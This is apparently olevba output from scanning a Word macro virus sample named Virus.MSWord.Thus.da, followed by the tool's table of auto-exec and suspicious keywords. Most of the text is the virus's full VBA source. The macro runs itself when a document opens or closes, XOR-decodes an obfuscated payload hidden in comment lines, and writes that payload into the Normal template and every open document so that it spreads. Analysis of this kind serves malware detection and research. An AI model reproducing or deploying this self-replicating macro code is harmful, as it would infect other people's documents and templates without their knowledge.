olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.da-9f363c2be600d09dd568676bb2bfac495b64db70
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.da-9f363c2be600d09dd568676bb2bfac495b64db70 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Alina_001'
Dim s, a As Integer, n, ch
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "'Alina_001'" Then
For i = 60 To 87
    s = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    For n = 1 To Len(s)
        ch = Mid(s, n, 1)
        a = Asc(ch)
        Mid(s, n, 1) = Chr(a Xor 7)
    Next n
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
Next i
Else
For i = 60 To 87
    s = VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    For n = 1 To Len(s)
        ch = Mid(s, n, 1)
        a = Asc(ch)
        Mid(s, n, 1) = Chr(a Xor 7)
    Next n
    VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
    VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
Next i
End If
qqq
For k = 1 To Application.Documents.Count
If Mid(Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(60, 1), 1, 1) <> "'" Then
   For i = 60 To 87
       s = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
       For n = 1 To Len(s)
           ch = Mid(s, n, 1)
           a = Asc(ch)
           Mid(s, n, 1) = Chr(a Xor 7)
       Next n
       Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
       Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
   Next i
End If
Next k
If Mid(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(60, 1), 1, 1) <> "'" Then
   For i = 60 To 87
       s = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
       For n = 1 To Len(s)
           ch = Mid(s, n, 1)
           a = Asc(ch)
           Mid(s, n, 1) = Chr(a Xor 7)
       Next n
       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
   Next i
End If
End Sub
Private Sub Document_Close()
  Document_Open
End Sub
Private Sub qqq()
''''Hi'Buuhu'Ubtrjb'Ibs
''''Fwwkndfsnhi)Hwsnhit)QnurtWuhsbdsnhi':'Afktb
''''Na'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)Knibt/5+'6.';9'% FknifX776 %'Sobi
''''IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb'X
'''')CbkbsbKnibt'6+'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)DhrisHaKnibt
''''Bic'Na
''''Na'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt':'7'Sobi
''''IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb'X
'''')NitbusKnibt'6+'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)Knibt/6+'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist'X
'''')Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt.
''''Bic'Na
''''Na'IhujfkSbjwkfsb)Tfqbc':'Afktb'Sobi'IhujfkSbjwkfsb)Tfqb
''''Ahu'l':'6'Sh'Fwwkndfsnhi)Chdrjbist)Dhris
''''Na'Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)Knibt/5+'6.';9'% FknifX776 %'Sobi
''''Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)CbkbsbKnibt'6+'Fwwkndfsnhi)Chdrjbist)Nsbj/l.'X
'''')QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt
''''Bic'Na
''''Na'Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt':'7'Sobi
''''Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)NitbusKnibt'6+'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist'X
'''')Nsbj/6.)DhcbJhcrkb)Knibt/6+'IhujfkSbjwkfsb)QEWuhmbds'X
'''')QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt.
''''Bic'Na
''''Ibs'l
'' Fknif+'~hr'f'ebfrsnarkbts'`nuk)'N'khqb'~hr)))
End Sub



























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
